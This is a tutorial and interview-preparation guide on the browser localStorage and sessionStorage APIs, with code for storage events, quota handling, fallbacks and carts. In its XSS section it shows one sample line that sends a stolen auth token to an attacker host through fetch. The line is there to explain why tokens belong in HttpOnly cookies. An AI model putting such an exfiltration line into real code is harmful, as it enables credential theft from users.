# Storage APIs: localStorage and sessionStorage

## Overview

**localStorage** and **sessionStorage** are two key browser storage APIs that allow you to store key-value data on the client side. They are part of the Web Storage API and provide a simple, synchronous interface for persisting data between page loads. While localStorage persists indefinitely, sessionStorage is cleared when the tab is closed. Both are essential for modern web applications that need offline capabilities, state persistence, and caching strategies.

### Key Characteristics
- **Synchronous API**: Blocking operations (use carefully in performance-critical paths)
- **Key-Value Store**: Simple string-based storage (JSON serialization required for objects)
- **Same-Origin Policy**: Each origin has isolated storage
- **Size Limit**: Typically 5-10MB per domain
- **No Expiration**: localStorage persists; sessionStorage clears on tab close
- **No Encryption**: Data is stored in plain text (XSS vulnerability)
- **Storage Events**: Changes can trigger events in other tabs

---

## Table of Contents

1. [localStorage vs sessionStorage](#localstorage-vs-sessionstorage)
2. [API Methods](#api-methods)
3. [Data Serialization](#data-serialization)
4. [Storage Events](#storage-events)
5. [Quota Management](#quota-management)
6. [Security Implications](#security-implications)
7. [Error Handling](#error-handling)
8. [Usage Patterns](#usage-patterns)
9. [Real-World Use Cases](#real-world-use-cases)
10. [Interview Questions](#interview-questions)
11. [Summary](#summary)

---

## localStorage vs sessionStorage

### Key Differences

| Feature | localStorage | sessionStorage |
|---------|--------------|----------------|
| **Lifetime** | Persists until manually cleared or browser cache cleared | Cleared when tab is closed |
| **Scope** | Same across all tabs/windows of the same origin | Specific to individual tab |
| **Capacity** | Typically 5-10MB | Typically 5-10MB |
| **Use Case** | Long-term data, user preferences, authentication tokens (risky) | Temporary data, page navigation state |
| **Cross-Tab** | Fires storage events in other tabs | No cross-tab communication |
| **Offline** | Accessible offline if already stored | Accessible offline if already stored |

### Practical Comparison

```javascript
// localStorage - survives page reloads and browser restart
localStorage.setItem('theme', 'dark');
// Data persists after closing and reopening browser

// sessionStorage - cleared when tab is closed
sessionStorage.setItem('tempData', 'xyz');
// Data lost when user closes the tab

// Real-world distinction
const user = {
  id: 123,
  name: 'John',
  preferences: { theme: 'dark' }
};

//  Suitable for localStorage
localStorage.setItem('userPreferences', JSON.stringify(user.preferences));

//  Suitable for sessionStorage
sessionStorage.setItem('currentPageScroll', window.scrollY);
sessionStorage.setItem('formDraftData', JSON.stringify(formState));
```

---

## API Methods

### Core Methods

#### 1. setItem(key, value)

```javascript
// Set a string value
localStorage.setItem('username', 'john_doe');

// Set a complex object (requires JSON serialization)
const userProfile = { id: 1, name: 'John', email: 'john@example.com' };
localStorage.setItem('profile', JSON.stringify(userProfile));

// Best practice with error handling
function safeSetItem(storage, key, value) {
  try {
    storage.setItem(key, value);
    return true;
  } catch (e) {
    if (e.name === 'QuotaExceededError') {
      console.error('Storage quota exceeded');
      // Implement cleanup logic
    }
    return false;
  }
}

safeSetItem(localStorage, 'key', 'value');
```

#### 2. getItem(key)

```javascript
// Get a string value
const username = localStorage.getItem('username');
console.log(username); // 'john_doe'

// Get and parse a JSON object
const profileJson = localStorage.getItem('profile');
const profile = JSON.parse(profileJson);
console.log(profile.name); // 'John'

// Handle non-existent keys (returns null)
const missing = localStorage.getItem('nonexistent');
console.log(missing); // null

// Safe retrieval with default values
function safeGetItem(storage, key, defaultValue = null) {
  try {
    const value = storage.getItem(key);
    return value !== null ? value : defaultValue;
  } catch (e) {
    console.error('Storage access error:', e);
    return defaultValue;
  }
}

const theme = safeGetItem(localStorage, 'theme', 'light');
```

#### 3. removeItem(key)

```javascript
// Remove a single item
localStorage.removeItem('username');
console.log(localStorage.getItem('username')); // null

// Safe removal
function safeRemoveItem(storage, key) {
  try {
    storage.removeItem(key);
  } catch (e) {
    console.error('Storage removal error:', e);
  }
}

safeRemoveItem(localStorage, 'tempData');
```

#### 4. clear()

```javascript
// Remove all items from storage
localStorage.clear();
sessionStorage.clear();

// Careful: This removes everything!
// Better to remove specific items:

// Selective clearing
function clearItemsWithPrefix(storage, prefix) {
  const keysToRemove = [];
  for (let i = 0; i < storage.length; i++) {
    const key = storage.key(i);
    if (key.startsWith(prefix)) {
      keysToRemove.push(key);
    }
  }
  keysToRemove.forEach(key => storage.removeItem(key));
}

clearItemsWithPrefix(localStorage, 'temp_');
```

#### 5. key(index)

```javascript
// Get key at specific index
for (let i = 0; i < localStorage.length; i++) {
  const key = localStorage.key(i);
  const value = localStorage.getItem(key);
  console.log(`${key}: ${value}`);
}

// Helper: Get all keys
function getAllKeys(storage) {
  const keys = [];
  for (let i = 0; i < storage.length; i++) {
    keys.push(storage.key(i));
  }
  return keys;
}

const allKeys = getAllKeys(localStorage);
```

#### 6. length property

```javascript
// Get number of stored items
console.log(localStorage.length); // 5

// Check if storage is empty
if (localStorage.length === 0) {
  console.log('Storage is empty');
}

// Monitor storage size
function getStorageSize(storage) {
  let size = 0;
  for (let i = 0; i < storage.length; i++) {
    const key = storage.key(i);
    const value = storage.getItem(key);
    size += key.length + value.length;
  }
  return size;
}

const sizeBytes = getStorageSize(localStorage);
console.log(`Storage uses approximately ${sizeBytes} bytes`);
```

---

## Data Serialization

### Working with Complex Objects

```javascript
//  String values (native support)
localStorage.setItem('name', 'John');
const name = localStorage.getItem('name'); // 'John'

//  Objects and arrays (require JSON serialization)
const user = {
  id: 1,
  name: 'John',
  tags: ['developer', 'frontend']
};

localStorage.setItem('user', JSON.stringify(user));
const retrievedUser = JSON.parse(localStorage.getItem('user'));

//   Booleans (stored as strings, must parse)
localStorage.setItem('loggedIn', true);
const loggedIn = localStorage.getItem('loggedIn') === 'true';

//   Numbers (stored as strings)
localStorage.setItem('count', 42);
const count = parseInt(localStorage.getItem('count'), 10);

//  Helper: Smart serialization
class StorageHelper {
  static set(key, value) {
    const serialized = JSON.stringify({
      value,
      type: typeof value,
      timestamp: Date.now()
    });
    localStorage.setItem(key, serialized);
  }

  static get(key) {
    const item = localStorage.getItem(key);
    if (item === null) return null;

    try {
      const { value, type } = JSON.parse(item);
      // Type could be used for automatic deserialization
      return value;
    } catch (e) {
      console.error('Failed to deserialize:', e);
      return null;
    }
  }
}

StorageHelper.set('settings', { theme: 'dark', fontSize: 14 });
const settings = StorageHelper.get('settings');
```

### Complex Data Structures

```javascript
//  Storing nested objects
const appState = {
  user: { id: 1, name: 'John' },
  ui: { theme: 'dark', sidebarOpen: true },
  cache: { posts: [], comments: {} }
};

localStorage.setItem('appState', JSON.stringify(appState));
const state = JSON.parse(localStorage.getItem('appState'));

//  Storing dates (must serialize specially)
const event = {
  title: 'Meeting',
  date: new Date('2025-01-15').toISOString() // Convert to string
};

localStorage.setItem('event', JSON.stringify(event));
const retrieved = JSON.parse(localStorage.getItem('event'));
const eventDate = new Date(retrieved.date); // Parse back to Date
```

---

## Storage Events

### Cross-Tab Communication

Storage events fire in **other tabs/windows** when localStorage changes, but NOT in the tab that made the change. This enables elegant cross-tab communication.

```javascript
// Tab 1: Make a change
localStorage.setItem('notification', 'You have a new message');

// Tab 2: Listen for the change
window.addEventListener('storage', (e) => {
  console.log('Storage changed:');
  console.log('Key:', e.key);                  // 'notification'
  console.log('Old value:', e.oldValue);       // null
  console.log('New value:', e.newValue);       // 'You have a new message'
  console.log('URL:', e.url);                  // Source tab's URL
  console.log('Storage area:', e.storageArea); // localStorage or sessionStorage
});
```

### Storage Event Object Properties

```javascript
window.addEventListener('storage', (e) => {
  // The key that was changed
  const key = e.key; // null if clear() was called

  // The old value (null if new key)
  const oldValue = e.oldValue;

  // The new value (null if removed)
  const newValue = e.newValue;

  // The URL of the page that triggered the event
  const url = e.url;

  // Reference to the storage object (localStorage or sessionStorage)
  const storage = e.storageArea;

  // Practical example: sync state across tabs
  if (key === 'theme') {
    document.documentElement.setAttribute('data-theme', newValue);
  }
});
```

### Real-World Example: Theme Synchronization

```javascript
// Shared across all tabs
class ThemeManager {
  constructor() {
    this.currentTheme = localStorage.getItem('theme') || 'light';
    this.listeners = [];

    // Listen for changes in other tabs
    window.addEventListener('storage', (e) => {
      if (e.key === 'theme') {
        this.currentTheme = e.newValue;
        this.notifyListeners();
      }
    });
  }

  setTheme(theme) {
    this.currentTheme = theme;
    localStorage.setItem('theme', theme);
    this.notifyListeners();
  }

  getTheme() {
    return this.currentTheme;
  }

  onThemeChange(callback) {
    this.listeners.push(callback);
  }

  notifyListeners() {
    this.listeners.forEach(cb => cb(this.currentTheme));
  }
}

// Usage
const themeManager = new ThemeManager();

// In Tab 1
themeManager.setTheme('dark');

// In Tab 2
themeManager.onThemeChange((newTheme) => {
  console.log('Theme changed to:', newTheme); // 'dark'
  document.body.classList.toggle('dark-mode', newTheme === 'dark');
});
```

### Important Limitation

```javascript
// L Storage events do NOT fire in the tab that made the change
localStorage.setItem('key', 'value');
console.log('Value set'); // Prints immediately

window.addEventListener('storage', (e) => {
  console.log('Storage event'); // Never fires in this tab
});

//  To react to changes in the same tab, listen for input events
const input = document.getElementById('colorPicker');
input.addEventListener('change', (e) => {
  localStorage.setItem('color', e.target.value);
  applyTheme(e.target.value); // Direct callback
});
```

---

## Quota Management

### Understanding Storage Limits

```javascript
// Typical limits: 5-10MB per domain
// Actual limit varies by browser:
// Chrome: 10MB
// Firefox: 10MB
// Safari: 5MB
// Edge: 10MB

// Check available quota
async function checkStorageQuota() {
  if ('storage' in navigator && 'estimate' in navigator.storage) {
    try {
      const estimate = await navigator.storage.estimate();
      const usage = estimate.usage;        // Bytes used
      const quota = estimate.quota;        // Total available
      const percentUsed = (usage / quota) * 100;

      console.log(`Storage usage: ${usage} bytes`);
      console.log(`Storage quota: ${quota} bytes`);
      console.log(`Percentage used: ${percentUsed.toFixed(2)}%`);

      return { usage, quota, percentUsed };
    } catch (e) {
      console.error('Storage quota estimation failed:', e);
    }
  }
}

// Check before storing large data
async function safeStore(key, data) {
  const quota = await navigator.storage.estimate();
  const dataSize = JSON.stringify(data).length;

  if (dataSize > quota.quota - quota.usage) {
    console.warn('Not enough storage space');
    return false;
  }

  localStorage.setItem(key, JSON.stringify(data));
  return true;
}
```

### Handling QuotaExceededError

```javascript
function storeData(key, value) {
  try {
    localStorage.setItem(key, value);
    console.log('Data stored successfully');
  } catch (e) {
    if (e.name === 'QuotaExceededError') {
      console.error('Storage quota exceeded');

      // Strategy 1: Clear old data
      clearExpiredData();

      // Try again
      try {
        localStorage.setItem(key, value);
        console.log('Data stored after cleanup');
      } catch (retryError) {
        console.error('Still not enough space');
      }

      // Strategy 2: Ask user
      if (confirm('Storage full. Clear cache?')) {
        localStorage.clear();
      }
    }
  }
}

// Helper: Clear items with expiration timestamps
function clearExpiredData() {
  const now = Date.now();
  const oneWeekMs = 7 * 24 * 60 * 60 * 1000;

  for (let i = localStorage.length - 1; i >= 0; i--) {
    const key = localStorage.key(i);
    const value = localStorage.getItem(key);

    try {
      const data = JSON.parse(value);
      if (data.expires && data.expires < now) {
        localStorage.removeItem(key);
      }
    } catch (e) {
      // Skip non-JSON items
    }
  }
}

// Store with expiration
function storeWithExpiration(key, value, expirationDays = 30) {
  const data = {
    value,
    expires: Date.now() + (expirationDays * 24 * 60 * 60 * 1000)
  };
  localStorage.setItem(key, JSON.stringify(data));
}
```

### Storage Strategy

```javascript
// Estimate before storing large data
async function storeIfFitsInQuota(key, value, priority = 'normal') {
  const quota = await navigator.storage.estimate();
  const available = quota.quota - quota.usage;
  const needed = JSON.stringify(value).length;

  if (needed > available) {
    // Remove low-priority items
    if (priority === 'high') {
      removeOldestItems();
    }

    if (needed > quota.quota - quota.usage) {
      console.warn('Data too large to store');
      return false;
    }
  }

  localStorage.setItem(key, JSON.stringify(value));
  return true;
}

// Keep track of item sizes
class StorageManager {
  static updateSize(key) {
    const item = localStorage.getItem(key);
    const size = item ? item.length : 0;
    const metadata = JSON.parse(localStorage.getItem('__metadata__') || '{}');
    metadata[key] = { size, timestamp: Date.now() };
    localStorage.setItem('__metadata__', JSON.stringify(metadata));
  }

  static getTotalSize() {
    const metadata = JSON.parse(localStorage.getItem('__metadata__') || '{}');
    return Object.values(metadata).reduce((sum, m) => sum + m.size, 0);
  }

  static removeOldest() {
    const metadata = JSON.parse(localStorage.getItem('__metadata__') || '{}');
    const oldest = Object.entries(metadata)
      .sort(([,a], [,b]) => a.timestamp - b.timestamp)[0];

    if (oldest) {
      localStorage.removeItem(oldest[0]);
      delete metadata[oldest[0]];
      localStorage.setItem('__metadata__', JSON.stringify(metadata));
    }
  }
}
```

---

## Security Implications

### XSS Vulnerability

```javascript
// L CRITICAL: localStorage is vulnerable to XSS attacks
// If attacker injects: localStorage.getItem('token')
// They can steal tokens!

localStorage.setItem('authToken', 'secret-token-123');

// Malicious script can steal this:
const stolen = localStorage.getItem('authToken'); //  Token compromised
fetch('https://attacker.com/steal?token=' + stolen);

//  Use HttpOnly cookies instead for sensitive tokens
// Set-Cookie: authToken=secret-123; HttpOnly; Secure; SameSite=Strict
// JavaScript cannot access HttpOnly cookies
```

### Don't Store Sensitive Data in localStorage

```javascript
// L NEVER store these in localStorage:
localStorage.setItem('password', 'user_password'); // 
localStorage.setItem('ssn', '123-45-6789');       // 
localStorage.setItem('creditCard', '4111111111'); // 
localStorage.setItem('authToken', 'secret');      //  (Use HttpOnly cookies)

//  SAFE to store in localStorage:
localStorage.setItem('theme', 'dark');
localStorage.setItem('language', 'en');
localStorage.setItem('userId', '12345');          // Not secret; can be public
localStorage.setItem('userEmail', 'user@example.com'); // Not secret

//  Use HttpOnly cookies for authentication
// Server sets: Set-Cookie: authToken=xyz; HttpOnly; Secure
// JavaScript cannot access it, preventing XSS token theft
```

### Input Validation

```javascript
//  Always validate data from storage
class SecureStorage {
  static set(key, value, schema) {
    // Validate before storing
    if (!this.validateSchema(value, schema)) {
      throw new Error('Invalid data schema');
    }
    localStorage.setItem(key, JSON.stringify(value));
  }

  static get(key, schema) {
    const raw = localStorage.getItem(key);
    if (!raw) return null;

    try {
      const value = JSON.parse(raw);
      // Validate retrieved data
      if (!this.validateSchema(value, schema)) {
        localStorage.removeItem(key); // Remove corrupted data
        return null;
      }
      return value;
    } catch (e) {
      console.error('Failed to parse stored data:', e);
      return null;
    }
  }

  static validateSchema(value, schema) {
    // Simple schema validation
    for (const [key, type] of Object.entries(schema)) {
      if (typeof value[key] !== type) {
        return false;
      }
    }
    return true;
  }
}

// Usage
const userSchema = { id: 'number', name: 'string', email: 'string' };
SecureStorage.set('user', { id: 1, name: 'John', email: 'john@example.com' }, userSchema);
```

### Content Security Policy (CSP)

```html
<!-- Protect against XSS while still allowing localStorage -->
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self';
               script-src 'self' 'nonce-random123';
               style-src 'self' 'unsafe-inline';">

<!-- This blocks inline scripts but allows legitimate storage access -->
```

---

## Error Handling

### Comprehensive Error Handling

```javascript
// Storage might be unavailable in private browsing mode
function isStorageAvailable(type) {
  try {
    const storage = window[type];
    const test = '__storage_test__';
    storage.setItem(test, test);
    storage.removeItem(test);
    return true;
  } catch (e) {
    return false;
  }
}

// Check before using
if (isStorageAvailable('localStorage')) {
  localStorage.setItem('key', 'value');
} else {
  console.warn('localStorage not available');
  // Use in-memory fallback or fallback to cookies
}

// Private browsing detection
function detectPrivateBrowsing() {
  return new Promise((resolve) => {
    const test = Math.random();
    try {
      localStorage.setItem('__test__', test);
      localStorage.removeItem('__test__');
      resolve(false); // Not private
    } catch (e) {
      resolve(true); // Private browsing
    }
  });
}

// Usage
detectPrivateBrowsing().then(isPrivate => {
  if (isPrivate) {
    console.log('User is in private browsing mode');
    // Use sessionStorage or in-memory storage instead
  }
});
```

### Graceful Degradation

```javascript
// Fallback storage strategies
class StorageFallback {
  static storage = new Map(); // In-memory fallback

  static setItem(key, value) {
    try {
      localStorage.setItem(key, value);
    } catch (e) {
      if (e.name === 'QuotaExceededError') {
        this.storage.set(key, value); // Use in-memory
        console.warn('Using in-memory storage (quota exceeded)');
      } else {
        this.storage.set(key, value); // Use in-memory
        console.warn('localStorage unavailable, using in-memory storage');
      }
    }
  }

  static getItem(key) {
    try {
      return localStorage.getItem(key);
    } catch (e) {
      return this.storage.get(key) || null;
    }
  }

  static removeItem(key) {
    try {
      localStorage.removeItem(key);
    } catch (e) {
      this.storage.delete(key);
    }
  }

  static clear() {
    try {
      localStorage.clear();
    } catch (e) {
      this.storage.clear();
    }
  }
}

// Usage
StorageFallback.setItem('user', 'John');
console.log(StorageFallback.getItem('user'));
```

---

## Usage Patterns

### Shopping Cart Example

```javascript
class ShoppingCart {
  constructor() {
    this.storageKey = 'cart_items';
    this.loadCart();
  }

  loadCart() {
    try {
      const cartJson = localStorage.getItem(this.storageKey);
      this.items = cartJson ? JSON.parse(cartJson) : [];
    } catch (e) {
      console.error('Failed to load cart:', e);
      this.items = [];
    }
  }

  addItem(product) {
    const existing = this.items.find(item => item.id === product.id);

    if (existing) {
      existing.quantity += product.quantity || 1;
    } else {
      this.items.push(product);
    }

    this.save();
  }

  removeItem(productId) {
    this.items = this.items.filter(item => item.id !== productId);
    this.save();
  }

  save() {
    try {
      localStorage.setItem(this.storageKey, JSON.stringify(this.items));
    } catch (e) {
      if (e.name === 'QuotaExceededError') {
        console.error('Cart storage full');
      }
    }
  }

  clear() {
    this.items = [];
    localStorage.removeItem(this.storageKey);
  }

  getTotal() {
    return this.items.reduce((sum, item) => sum + (item.price * item.quantity), 0);
  }
}

// Usage
const cart = new ShoppingCart();
cart.addItem({ id: 1, name: 'Laptop', price: 999, quantity: 1 });
cart.addItem({ id: 2, name: 'Mouse', price: 29, quantity: 2 });
console.log('Total:', cart.getTotal());
```

### User Preferences Manager

```javascript
class UserPreferences {
  constructor() {
    this.prefixes = {
      user: 'user_',
      ui: 'ui_',
      cache: 'cache_'
    };
  }

  setUserPref(key, value) {
    localStorage.setItem(this.prefixes.user + key, JSON.stringify(value));
  }

  getUserPref(key, defaultValue) {
    const value = localStorage.getItem(this.prefixes.user + key);
    return value ? JSON.parse(value) : defaultValue;
  }

  setUIPref(key, value) {
    localStorage.setItem(this.prefixes.ui + key, JSON.stringify(value));
  }

  getUIPref(key, defaultValue) {
    const value = localStorage.getItem(this.prefixes.ui + key);
    return value ? JSON.parse(value) : defaultValue;
  }

  syncPreferences() {
    // Load from server and merge with local storage
    fetch('/api/preferences').then(r => r.json()).then(serverPrefs => {
      Object.entries(serverPrefs).forEach(([key, value]) => {
        this.setUserPref(key, value);
      });
    });
  }

  clearAll() {
    Object.values(this.prefixes).forEach(prefix => {
      Object.keys(localStorage).forEach(key => {
        if (key.startsWith(prefix)) {
          localStorage.removeItem(key);
        }
      });
    });
  }
}

// Usage
const prefs = new UserPreferences();
prefs.setUserPref('language', 'en');
prefs.setUIPref('theme', 'dark');
prefs.setUIPref('sidebarCollapsed', true);

console.log(prefs.getUserPref('language')); // 'en'
console.log(prefs.getUIPref('theme')); // 'dark'
```

---

## Real-World Use Cases

### 1. Form Auto-Save

```javascript
class FormAutoSaver {
  constructor(formId, autosaveInterval = 30000) {
    this.form = document.getElementById(formId);
    this.storageKey = `autosave_${formId}`;
    this.interval = autosaveInterval;

    this.form.addEventListener('input', () => this.save());
    this.restoreSavedData();
  }

  save() {
    const formData = new FormData(this.form);
    const data = Object.fromEntries(formData);
    localStorage.setItem(this.storageKey, JSON.stringify({
      data,
      timestamp: Date.now()
    }));
  }

  restoreSavedData() {
    const saved = localStorage.getItem(this.storageKey);
    if (!saved) return;

    try {
      const { data, timestamp } = JSON.parse(saved);
      const hourAgo = Date.now() - 60 * 60 * 1000;

      // Only restore if saved within last hour
      if (timestamp > hourAgo) {
        Object.entries(data).forEach(([key, value]) => {
          const field = this.form.querySelector(`[name="${key}"]`);
          if (field) field.value = value;
        });
        console.log('Form data restored');
      }
    } catch (e) {
      console.error('Failed to restore form data:', e);
    }
  }

  clear() {
    localStorage.removeItem(this.storageKey);
  }
}

// Usage
new FormAutoSaver('contact-form', 30000);
```

### 2. Session Management

```javascript
class SessionManager {
  constructor(sessionTimeout = 30 * 60 * 1000) { // 30 minutes
    this.sessionTimeout = sessionTimeout;
    this.startTime = Date.now();
    this.lastActivity = Date.now();

    document.addEventListener('mousemove', () => this.recordActivity());
    document.addEventListener('keypress', () => this.recordActivity());

    setInterval(() => this.checkSessionExpiry(), 60000); // Check every minute
  }

  recordActivity() {
    this.lastActivity = Date.now();
  }

  saveSession(data) {
    sessionStorage.setItem('session', JSON.stringify({
      data,
      startTime: this.startTime,
      lastActivity: this.lastActivity
    }));
  }

  getSession() {
    const sessionData = sessionStorage.getItem('session');
    return sessionData ? JSON.parse(sessionData) : null;
  }

  checkSessionExpiry() {
    const elapsed = Date.now() - this.lastActivity;
    if (elapsed > this.sessionTimeout) {
      this.endSession();
    }
  }

  endSession() {
    sessionStorage.clear();
    window.location.href = '/login';
  }
}

// Usage
const session = new SessionManager(30 * 60 * 1000);
session.saveSession({ userId: 123, role: 'admin' });
```

---

## Interview Questions

### 1. What's the difference between localStorage and sessionStorage?

**Answer:**
- **Lifetime**: localStorage persists indefinitely until manually cleared, while sessionStorage is cleared when the tab closes
- **Scope**: localStorage is shared across all tabs of the same origin, sessionStorage is tab-specific
- **Use Cases**: localStorage for long-term data (preferences, user ID), sessionStorage for temporary data (current form state, page navigation state)
- **Cross-Tab**: localStorage fires storage events in other tabs; sessionStorage doesn't communicate between tabs
- **Size**: Both typically support 5-10MB per origin

```javascript
// localStorage - survives tab closure
localStorage.setItem('userId', '123');

// sessionStorage - cleared on tab close
sessionStorage.setItem('currentScroll', window.scrollY);
```

### 2. How do storage events work for cross-tab communication?

**Answer:**
Storage events fire in **other tabs** when localStorage changes, enabling real-time synchronization:

```javascript
// Tab 1: Make change
localStorage.setItem('notification', 'New message');

// Tab 2: Listen for change
window.addEventListener('storage', (e) => {
  if (e.key === 'notification') {
    showNotification(e.newValue);
  }
});

// Important: Storage events do NOT fire in the tab that made the change
```

### 3. What are the security risks of localStorage?

**Answer:**
- **XSS Vulnerability**: Any JavaScript code (including malicious injected scripts) can access localStorage data
- **No Encryption**: Data stored in plain text, visible in DevTools
- **Not for Sensitive Data**: Never store passwords, credit cards, or authentication tokens
- **Cross-Site Leakage**: Could be exposed via developer tools or malware

```javascript
// L Bad: Storing auth token
localStorage.setItem('authToken', 'secret-123');
// Any injected script can access it

//  Good: Using HttpOnly cookies
// Set-Cookie: authToken=secret-123; HttpOnly; Secure
// JavaScript cannot access HttpOnly cookies
```

### 4. How do you handle QuotaExceededError?

**Answer:**
```javascript
function storeData(key, value) {
  try {
    localStorage.setItem(key, JSON.stringify(value));
  } catch (e) {
    if (e.name === 'QuotaExceededError') {
      // Strategy 1: Clear expired data
      clearExpiredItems();

      // Strategy 2: Remove least recently used items
      removeLRUItems();

      // Strategy 3: Ask user for permission
      if (confirm('Storage full. Clear old data?')) {
        localStorage.clear();
      }
    }
  }
}
```

### 5. How would you implement a shopping cart with localStorage?

**Answer:**
```javascript
class Cart {
  constructor() {
    this.items = this.load();
  }

  load() {
    const data = localStorage.getItem('cart');
    return data ? JSON.parse(data) : [];
  }

  save() {
    try {
      localStorage.setItem('cart', JSON.stringify(this.items));
    } catch (e) {
      console.error('Failed to save cart:', e);
    }
  }

  addItem(product) {
    const existing = this.items.find(item => item.id === product.id);
    if (existing) {
      existing.quantity += product.quantity || 1;
    } else {
      this.items.push(product);
    }
    this.save();
  }

  getTotal() {
    return this.items.reduce((sum, item) => sum + (item.price * item.quantity), 0);
  }
}
```

### 6. Can you encrypt data in localStorage?

**Answer:**
Yes, using the Web Crypto API, but with limitations:

```javascript
async function encryptAndStore(key, data, password) {
  const encoder = new TextEncoder();
  const pwHash = await crypto.subtle.digest('SHA-256', encoder.encode(password));

  const encryptedData = await crypto.subtle.encrypt(
    { name: 'AES-GCM', iv: crypto.getRandomValues(new Uint8Array(12)) },
    await crypto.subtle.importKey('raw', pwHash, 'AES-GCM', false, ['encrypt']),
    encoder.encode(JSON.stringify(data))
  );

  localStorage.setItem(key, btoa(String.fromCharCode(...new Uint8Array(encryptedData))));
}
```

However: encryption adds complexity and the password must be stored somewhere, reducing security benefits. For sensitive data, use HttpOnly cookies instead.

### 7. What happens if localStorage is unavailable?

**Answer:**
In private browsing mode, some browsers restrict localStorage access. Check availability first:

```javascript
function isStorageAvailable() {
  try {
    const test = '__test__';
    localStorage.setItem(test, test);
    localStorage.removeItem(test);
    return true;
  } catch (e) {
    return false;
  }
}

if (isStorageAvailable()) {
  localStorage.setItem('key', 'value');
} else {
  // Use in-memory cache or sessionStorage
}
```

### 8. How would you sync localStorage across multiple tabs?

**Answer:**
Use storage events to keep multiple tabs synchronized:

```javascript
class SyncedStore {
  constructor(key) {
    this.key = key;
    this.listeners = [];

    window.addEventListener('storage', (e) => {
      if (e.key === this.key) {
        this.notify(JSON.parse(e.newValue));
      }
    });
  }

  setValue(value) {
    localStorage.setItem(this.key, JSON.stringify(value));
    this.notify(value);
  }

  getValue() {
    const data = localStorage.getItem(this.key);
    return data ? JSON.parse(data) : null;
  }

  onChange(callback) {
    this.listeners.push(callback);
  }

  notify(value) {
    this.listeners.forEach(cb => cb(value));
  }
}

// Usage across tabs
const theme = new SyncedStore('theme');
theme.onChange(newTheme => {
  document.documentElement.setAttribute('data-theme', newTheme);
});
```

### 9. What's the difference between localStorage and IndexedDB?

**Answer:**
| Feature | localStorage | IndexedDB |
|---------|--------------|----------|
| **Size** | 5-10MB | Hundreds of MB to GB |
| **API** | Synchronous | Asynchronous |
| **Data Types** | Strings only | Any JavaScript object |
| **Performance** | Fast for small data | Faster for large datasets |
| **Querying** | Manual parsing | Advanced queries with indexes |
| **Use Case** | Simple preferences | Large offline apps |

### 10. How would you detect and handle storage quota exceeded errors?

**Answer:**
```javascript
async function checkQuota() {
  const estimate = await navigator.storage.estimate();
  const percentUsed = (estimate.usage / estimate.quota) * 100;

  console.log(`Using ${percentUsed.toFixed(2)}% of quota`);

  if (percentUsed > 90) {
    console.warn('Storage nearly full');
    cleanupOldData();
  }
}

function cleanupOldData() {
  const now = Date.now();
  const thirtyDaysMs = 30 * 24 * 60 * 60 * 1000;

  Object.keys(localStorage).forEach(key => {
    try {
      const data = JSON.parse(localStorage.getItem(key));
      if (data.timestamp && now - data.timestamp > thirtyDaysMs) {
        localStorage.removeItem(key);
      }
    } catch (e) {
      // Skip non-JSON items
    }
  });
}
```

---

## Summary

### Key Takeaways

1. **Use localStorage for persistent data** (theme, preferences, non-sensitive user IDs)
2. **Use sessionStorage for temporary data** (current page state, form drafts)
3. **Never store sensitive data** (passwords, tokens, SSN) in client storage
4. **Always handle errors** (QuotaExceededError, unavailable storage)
5. **Validate all retrieved data** (could be corrupted or stale)
6. **Use HttpOnly cookies for authentication** (prevent XSS token theft)
7. **Implement storage events** for cross-tab synchronization
8. **Monitor quota usage** and implement cleanup strategies
9. **Check storage availability** before use (private browsing mode)
10. **Serialize complex objects** properly (JSON.stringify/parse)

### Do's and Don'ts

**Do's:**
- Check storage availability before using
- Use try-catch for all storage operations
- Validate and sanitize retrieved data
- Implement expiration strategies
- Monitor quota usage
- Use JSON for complex data
- Clear sensitive data on logout
- Implement fallback strategies

**Don'ts:**
- Don't store passwords or sensitive data
- Don't store authentication tokens (use HttpOnly cookies)
- Don't trust data without validation
- Don't ignore quota errors
- Don't use synchronous storage in critical paths
- Don't forget private browsing restrictions
- Don't store large binary data
- Don't expose storage keys in error messages

---

## External Resources

### Official Documentation
- [MDN - Web Storage API](https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API)
- [MDN - localStorage](https://developer.mozilla.org/en-US/docs/Web/API/Window/localStorage)
- [MDN - sessionStorage](https://developer.mozilla.org/en-US/docs/Web/API/Window/sessionStorage)
- [MDN - Storage Events](https://developer.mozilla.org/en-US/docs/Web/API/StorageEvent)
- [WHATWG - Storage Living Standard](https://storage.spec.whatwg.org/)

### Security Resources
- [OWASP - DOM Based XSS](https://owasp.org/www-community/attacks/DOM_Based_XSS)
- [web.dev - Storage Security](https://web.dev/security-storage/)
- [MDN - Authentication Security](https://developer.mozilla.org/en-US/docs/Web/API/Storage_Access_API)

### Browser APIs
- [MDN - StorageManager](https://developer.mozilla.org/en-US/docs/Web/API/StorageManager)
- [Can I Use - Web Storage](https://caniuse.com/namevalue-storage)

### Related Articles
- [Storing Tokens in Browser](https://blog.ably.io/authentication-and-realtime/)
- [localStorage vs Cookies](https://stackoverflow.com/questions/3220660/local-storage-vs-cookies)

---

## Navigation

**Previous:** [Browser APIs README](./README.md)

**Next:** [02-cookies-same-site.md](./02-cookies-same-site.md)

---

**Last Updated**: December 2025
**Difficulty**: Intermediate
**Time to Complete**: 4-5 hours
**Repository**: [interview-preparation](https://github.com/salman-rahman/interview-preparation)
